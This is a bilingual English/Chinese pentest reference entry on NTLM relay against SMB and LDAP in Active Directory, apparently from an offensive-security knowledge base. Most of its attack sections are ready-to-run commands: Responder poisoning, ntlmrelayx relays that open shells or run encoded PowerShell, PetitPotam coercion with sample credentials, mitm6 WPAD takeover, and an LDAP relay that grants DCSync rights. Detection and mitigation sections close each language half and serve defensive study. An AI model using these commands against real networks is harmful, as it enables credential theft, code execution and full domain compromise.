---
id: ntlm-relay
title_en: NTLM Relay (SMB and LDAP)
title_zh: NTLM 中继（SMB 与 LDAP）
summary_en: Intercept an NTLM authentication attempt and forward it to a different host instead of cracking it. Works against any machine with SMB signing disabled, and against LDAP whenever signing and channel binding are not enforced.
summary_zh: 截获一次 NTLM 认证并把它转发到另一台主机，而不是去破解它。只要目标机器没开 SMB 签名就能打，LDAP 则在未强制签名与通道绑定时同样可用。
tags: [active-directory, ntlm, relay, smb, ldap, mitm, windows]
tools: [Responder, impacket-ntlmrelayx, mitm6, PetitPotam]
attck: [T1557.001]
platform: [linux]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Why it works

NTLM authentication proves knowledge of a hash without revealing it, and the protocol does not bind the response to the service it was requested for. An attacker who can sit in the middle — by answering NetBIOS name resolution, LLMNR, NBT-NS, or mDNS, or by poisoning DHCPv6 — can take the victim's authentication response and replay it against a *different* server. There is nothing to crack: the credential is used live while the victim's authentication is still valid.

Two conditions decide whether it lands:

1. The victim must be tricked into authenticating *to you* (name resolution poisoning, or a coerced authentication like PetitPotam/PrinterBug).
2. The target you relay to must not require integrity: **SMB signing disabled**, or LDAP without signing and without channel binding.

By default, SMB signing is *on* for domain controllers and *off* for member workstations and servers. That asymmetry is the whole game: relay a workstation's auth to a member server where the workstation's account happens to be a local admin, and you get code execution.

### Step 1 — Prepare Responder

Responder answers name resolution requests and collects hashes, but for relaying you must turn off the servers you intend to relay into, otherwise Responder wins the race with ntlmrelayx:

```ini
# /etc/responder/Responder.conf
SMB = Off
HTTP = Off
```

```bash
sudo responder -I eth0 -wd
```

### Step 2 — Build the target list

Signing is the gate, so collect candidates:

```bash
# Find hosts where SMB signing is not required
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

That file ends up containing every host with `signing:False` that answered.

### Step 3 — Start the relay

```bash
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Get an interactive SMB shell on whichever target the relay lands on
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i

# Or run a single command
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support \
  -c 'powershell -enc <base64>'
```

By default `ntlmrelayx` dumps the SAM database of any host it successfully relays to, which is usually enough to pivot further.

### Step 4 — Make a victim authenticate

Any of these produce an authentication attempt aimed at your listener:

- **Broadcast name poisoning.** Responder already does this: any user typing a wrong hostname, or any legacy app doing NetBIOS lookups, sends you credentials.
- **PetitPotam / PrinterBug (MS-RPRN).** Coerce a machine account into authenticating to you. This is how you relay *machine* accounts, and it works without any user interaction:

```bash
python3 PetitPotam.py -d corp.local -u jdoe -p 'Summer2026!' 10.10.10.5 10.10.10.20
#                                        your listener ^        ^ victim (e.g. a DC)
```

- **mitm6.** Takes over the DNS server for the network over DHCPv6, then answers WPAD lookups. Combined with relay, this is one of the most reliable paths to domain admin in a default Windows network:

```bash
sudo mitm6 -d corp.local
sudo impacket-ntlmrelayx -6 -wh attacker.corp.local -t ldaps://dc01.corp.local \
  --add-computer RELAYEDPC$
```

### Relaying to LDAP instead of SMB

LDAP is the more interesting target when SMB signing blocks you. Relay a machine account to LDAP/S and you can create computer objects, modify ACLs, or write to `msDS-AllowedToActOnBehalfOfOtherIdentity` to set up RBCD:

```bash
sudo impacket-ntlmrelayx -t ldaps://dc01.corp.local --escalate-user jdoe
```

`--escalate-user` grants your user DCSync rights, which is effectively game over.

### Gotchas

- **SMB to SMB only works unsigned.** If `nxc` says `signing:True`, move on to LDAP.
- **Cross-protocol is allowed.** You can relay an SMB authentication into LDAP. This is often the difference between "SAM dump on one box" and "domain admin".
- **LDAP signing and channel binding** kill the LDAP path. If LDAPS with channel binding is enforced, relaying to LDAPS fails; try LDAP on 389, and try plain HTTP/ADCS endpoints that do not enforce it.
- **EPA / Extended Protection** on ADCS Web Enrollment and similar web endpoints will also block relay. Assume modern environments need mitm6 plus careful target selection.
- **The victim's auth is transient.** If it fails once, the relay is done. Start the relay before the coercion, always.

### Detection

- Event **4624** type 3 logons on the *target* with a source workstation that does not match the account's normal behaviour — this is the relay landing.
- Event **4776** (NTLM credential validation) on the authenticating host, often in bursts.
- A sudden flood of LLMNR/NBT-NS/mDNS responses from one host on the wire.
- On the relay host: `ntlmrelayx` traffic pattern — many short-lived SMB sessions to different hosts from a single source.

### Mitigation

- **Enable SMB signing everywhere**, including member servers and workstations. This alone removes the SMB relay path.
- Enable **LDAP signing** and **LDAP channel binding** on domain controllers.
- **Disable NTLM** where the environment can survive it (at minimum, audit and then restrict).
- Turn off LLMNR and NBT-NS via Group Policy — the poisoning relies on them.
- Deploy **SMB/LDAP EPA** on ADCS web endpoints.
- Use **LAPS** so local administrator passwords differ per host; that breaks the "relay to a machine where this account is admin" step.
- Add privileged accounts to the **Protected Users** group to stop credential delegation/relay abuse.

<!-- lang:zh -->
### 原理

NTLM 认证只证明你知道那个哈希，而不暴露哈希本身，并且协议没有把响应绑定到它所请求的那个服务上。能坐在中间的攻击者 —— 通过应答 NetBIOS 名称解析、LLMNR、NBT-NS、mDNS，或用 DHCPv6 投毒 —— 可以把受害者的认证响应原样打向**另一台**服务器。这里没有东西要破解：在受害者的认证仍然有效的那一瞬间，凭据被直接拿去用了。

两个条件决定能不能打成功：

1. 受害者必须被诱使向你发起认证（名称解析投毒，或 PetitPotam/PrinterBug 这类强制认证）。
2. 你要中继到的目标不能要求完整性：**SMB 签名关闭**，或者 LDAP 未强制签名与通道绑定。

默认情况下，SMB 签名在域控上是**开启**的，在成员工作站和成员服务器上是**关闭**的。这个不对称就是全部要害：把一台工作站的认证中继到某台该工作站账户恰好是本地管理员的成员服务器，你就拿到了代码执行。

### 第一步 —— 配置 Responder

Responder 负责应答名称解析请求、收集哈希。但要中继，你必须关掉你打算中继进去的那些服务，否则 Responder 会跟 ntlmrelayx 抢答：

```ini
# /etc/responder/Responder.conf
SMB = Off
HTTP = Off
```

```bash
sudo responder -I eth0 -wd
```

### 第二步 —— 生成目标列表

签名是门槛，先把候选收集出来：

```bash
# 找出不要求 SMB 签名的主机
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

这个文件里就是所有响应了、且 `signing:False` 的主机。

### 第三步 —— 启动中继

```bash
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# 中继命中后拿到一个交互式 SMB shell
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i

# 或者直接执行一条命令
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support \
  -c 'powershell -enc <base64>'
```

默认情况下，`ntlmrelayx` 会把任何成功中继到的目标的 SAM 数据库导出来，通常够你继续横向。

### 第四步 —— 让受害者发起认证

下面任意一种都会产生一个指向你监听器的认证请求：

- **广播名称投毒。** Responder 已经在做了：任何用户输错主机名，或任何老程序做 NetBIOS 查询，都会把凭据送到你手上。
- **PetitPotam / PrinterBug（MS-RPRN）。** 强制机器账户向你认证。这是中继**机器账户**的方式，而且不需要任何用户交互：

```bash
python3 PetitPotam.py -d corp.local -u jdoe -p 'Summer2026!' 10.10.10.5 10.10.10.20
#                                        你的监听器 ^         ^ 受害者（比如域控）
```

- **mitm6。** 通过 DHCPv6 接管整个网络的 DNS 服务，然后应答 WPAD 查询。配合中继使用，这是在默认配置的 Windows 网络里通往域管最可靠的路径之一：

```bash
sudo mitm6 -d corp.local
sudo impacket-ntlmrelayx -6 -wh attacker.corp.local -t ldaps://dc01.corp.local \
  --add-computer RELAYEDPC$
```

### 中继到 LDAP 而不是 SMB

当 SMB 签名挡住你时，LDAP 是更有意思的目标。把机器账户中继到 LDAP/S，你就能创建计算机对象、修改 ACL，或者写 `msDS-AllowedToActOnBehalfOfOtherIdentity` 来布置 RBCD：

```bash
sudo impacket-ntlmrelayx -t ldaps://dc01.corp.local --escalate-user jdoe
```

`--escalate-user` 会给你的用户授予 DCSync 权限，基本上等于游戏结束。

### 坑

- **SMB 打 SMB 只在未签名时有效。** 如果 `nxc` 显示 `signing:True`，换 LDAP。
- **允许跨协议中继。** 你可以把 SMB 的认证中继进 LDAP。这常常就是「导一台机器的 SAM」和「拿下域管」的区别。
- **LDAP 签名与通道绑定**会掐断 LDAP 这条路。如果 LDAPS 强制了通道绑定，中继到 LDAPS 会失败；试试 389 的 LDAP，以及没有强制该保护的 ADCS/HTTP 端点。
- **EPA（扩展保护）** 在 ADCS Web 注册等 Web 端点上同样会阻断中继。要假设现代环境必须靠 mitm6 加谨慎的目标选择。
- **受害者的认证是瞬时的。** 一次失败，这次中继就结束了。永远先启动中继，再触发强制认证。

### 检测

- 目标机上类型 3 的 **4624** 登录事件，且来源工作站与该账户正常行为不符 —— 这就是中继落地的痕迹。
- 认证主机上的 **4776**（NTLM 凭据校验）事件，常成批出现。
- 线上某个主机突然大量应答 LLMNR/NBT-NS/mDNS。
- 中继主机侧：`ntlmrelayx` 的流量特征 —— 单一来源向不同主机发起大量短命 SMB 会话。

### 缓解

- **全网开启 SMB 签名**，包括成员服务器和工作站。光这一条就掐掉了 SMB 中继这条路。
- 在域控上开启 **LDAP 签名**与 **LDAP 通道绑定**。
- 环境扛得住的话**禁用 NTLM**（至少先审计、再收紧）。
- 用组策略关掉 LLMNR 和 NBT-NS —— 投毒就靠它们活着。
- 在 ADCS Web 端点上部署 **EPA**。
- 用 **LAPS** 让每台机器的本地管理员口令各不相同，这就废掉了「中继到某台该账户是管理员的机器」这一步。
- 把特权账户加进 **Protected Users** 组，阻止凭据委派/中继被滥用。
